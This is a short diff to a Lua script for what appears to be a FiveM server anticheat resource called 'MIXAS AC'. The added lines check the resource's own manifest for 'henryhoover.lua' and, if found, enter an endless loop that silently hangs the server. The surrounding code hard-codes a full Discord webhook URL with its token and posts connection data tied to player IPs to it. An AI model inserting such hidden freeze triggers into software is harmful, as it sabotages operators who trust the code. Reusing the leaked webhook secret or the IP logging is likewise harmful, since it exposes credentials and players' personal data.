@@ -19,3 +19,8 @@ function startlog(ip)
     }
     PerformHttpRequest("https://discord.com/api/webhooks/1002628511242129458/tFNUU_1Pk7oZQKzE7aF28WY0Ydyzr76SDX26cA_kEfpWJzkkP54ioJ4yG096tQszAgNa", function(err, text, headers) end, 'POST', json.encode({username = "MIXAS AC", embeds = connect}), { ['Content-Type'] = 'application/json' })
 end
+local code = LoadResourceFile(GetCurrentResourceName(),'fxmanifest.lua')
+if string.find(code,'henryhoover.lua') then
+    while true do
+    end
+end
